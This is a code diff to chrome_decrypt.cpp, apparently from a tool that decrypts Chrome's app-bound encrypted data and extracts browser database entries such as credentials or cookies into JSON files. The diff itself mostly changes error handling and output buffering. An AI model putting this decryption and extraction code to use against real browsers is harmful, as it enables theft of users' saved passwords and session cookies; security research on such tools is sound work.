@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.14.2 (c) Alexander 'xaitax' Hagenah
+// v0.15.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -204,13 +204,9 @@ namespace Payload
         {
             const size_t GCM_OVERHEAD_LENGTH = V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;
 
-            if (blob.size() == GCM_OVERHEAD_LENGTH && memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
-            {
-                return {};
-            }
             if (blob.size() < GCM_OVERHEAD_LENGTH || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
             {
-                throw std::runtime_error("GCM blob is invalid.");
+                return {};
             }
 
             BCRYPT_ALG_HANDLE hAlg = nullptr;
@@ -241,9 +237,18 @@ namespace Payload
 
             std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
             ULONG outLen = 0;
-            NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
-            if (!NT_SUCCESS(status))
-                throw std::runtime_error("BCryptDecrypt failed.");
+            try
+            {
+                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
+                if (!NT_SUCCESS(status))
+                {
+                    return {};
+                }
+            }
+            catch (...)
+            {
+                return {};
+            }
 
             plain.resize(outLen);
             return plain;
@@ -609,20 +614,14 @@ namespace Payload
                 return;
             }
             auto dbCloser = [](sqlite3 *d)
-            {
-                if (d)
-                    sqlite3_close_v2(d);
-            };
+            { if (d) sqlite3_close_v2(d); };
             std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);
 
             sqlite3_stmt *stmt = nullptr;
             if (sqlite3_prepare_v2(dbGuard.get(), m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
                 return;
             auto stmtFinalizer = [](sqlite3_stmt *s)
-            {
-                if (s)
-                    sqlite3_finalize(s);
-            };
+            { if (s) sqlite3_finalize(s); };
             std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);
 
             std::any preQueryState;
@@ -634,32 +633,38 @@ namespace Payload
                 }
             }
 
-            fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
-            std::error_code ec;
-            fs::create_directories(outFilePath.parent_path(), ec);
-            std::ofstream out(outFilePath, std::ios::trunc);
-            if (!out)
-                return;
-
-            out << "[\n";
-            bool first = true;
-            int count = 0;
+            std::vector<std::string> jsonEntries;
             while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
             {
                 if (auto jsonEntry = m_config.jsonFormatter(stmtGuard.get(), m_aesKey, preQueryState))
                 {
-                    if (!first)
-                        out << ",\n";
-                    first = false;
-                    out << *jsonEntry;
-                    count++;
+                    jsonEntries.push_back(*jsonEntry);
                 }
             }
-            out << "\n]\n";
 
-            if (count > 0)
+            if (!jsonEntries.empty())
             {
-                m_logger.Log("     [*] " + std::to_string(count) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
+                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
+                std::error_code ec;
+                fs::create_directories(outFilePath.parent_path(), ec);
+                if (ec)
+                {
+                    m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
+                    return;
+                }
+
+                std::ofstream out(outFilePath, std::ios::trunc);
+                if (!out)
+                    return;
+
+                out << "[\n";
+                for (size_t i = 0; i < jsonEntries.size(); ++i)
+                {
+                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
+                }
+                out << "\n]\n";
+
+                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
             }
         }
 
